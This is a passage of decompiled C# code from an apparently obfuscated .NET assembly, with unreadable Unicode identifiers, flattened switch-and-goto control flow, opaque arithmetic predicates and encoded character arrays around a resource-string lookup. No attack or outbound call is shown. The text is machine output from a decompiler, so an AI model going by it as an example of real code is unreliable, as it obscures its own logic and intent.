            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.ႷႰ);
            num2 = 9;
            continue;
        }
      }
label_13:
      return num3;
    }

    [SecuritySafeCritical]
    internal static string ႷႭ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00212 obj0,
      [In] \u0021\u00211 obj1,
      [In] \u0021\u00210 obj2,
      [In] short obj3,
      [In] char obj4)
      where \u0021\u00210 : CultureInfo
      where \u0021\u00211 : string
      where \u0021\u00212 : ResourceManager
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = 3;
      IEnumerable enumerable;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_12;
          case 2:
          case 8:
            ++num1;
            num2 = 27 < 108 / 4 - 22 ? (int) ⴃ[240] - 57248 : 1;
            continue;
          case 3:
            int num3;
            switch (((int) obj4 ^ (int) obj3) - 74 ^ num1)
            {
              case 0:
                num3 = 6;
                break;
              default:
                num3 = 9;
                break;
            }
            num2 = num3;
            continue;
          case 4:
            num2 = 3;
            continue;
          case 5:
          case 6:
            enumerable = (IEnumerable) obj0.GetString((string) obj1, (CultureInfo) obj2);
            num2 = (int) ⴅ[102] - 200;
            continue;
          case 9:
            enumerable = (IEnumerable) null;
            goto case 10;
          case 10:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႠ.ႷႤ.ႷႭ);
            num2 = 0;
            continue;
        }
      }
label_12:
      return enumerable as string;
    }

    static ႷႤ()
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
      int num = 3;
      object obj;
      while (true)
      {
        switch (num)
        {
          case 1:
            (obj as char[])[2] = 'Ұ';
            (obj as char[])[0] = 'ᴏ';
            num = (int) ⴅ[213] - (int) ⴅ[75];
            continue;
          case 2:
            obj = (object) new char[8];
            (obj as char[])[4] = 'ጷ';
            num = 6;
            continue;
          case 4:
            goto label_8;
          case 5:
            ((char[]) obj)[1] = 'ṋ';
            goto case 7;
          case 6:
            ((char[]) obj)[6] = 'ⷈ';
            (obj as char[])[5] = '̏';
            num = (int) ⴅ[165] - (int) ⴅ[64];
            continue;
          case 7:
            ((char[]) obj)[3] = '}';
            num = (int) ⴃ[71] - 50493;
            continue;
          default:
            ႷႠ.ႷႤ.Ⴀ = (Array) new char[39]
            {
              '芄',
              '苀',
              '芄',
              '\u9FEE',
              '뭿',
              '꼭',
              '膿',
              '醄',
              '芘',
              '蘇',
              '鳷',
              '\u9FEA',
              '뭺',
              '꽼',
              '膾',
              '醞',
              '芚',
              '虒',
              '鳾',
              '\u9FEA',
              '뭢',
              '꼭',
              '自',
              '醊',
              '苍',
              '蘙',
              '鲮',
              '龾',
              '묫',
              '꼭',
              '膦',
              '醅',
              '苁',
              '蘇',
              '鲩',
              '龹',
              '뭺',
              '꼭',
              '臮'
            };
            goto case 2;
        }
      }
label_8:
      ((char[]) obj)[7] = '㧋';
      ႷႠ.ႷႤ.Ⴐ = (object) new string[1];
      ႷႠ.ႷႤ.Ⴅ = (Array) (obj as char[]);
    }

    [StructLayout(LayoutKind.Explicit, Size = 78, Pack = 1)]
    private struct Ⴍ
    {
    }
  }
}
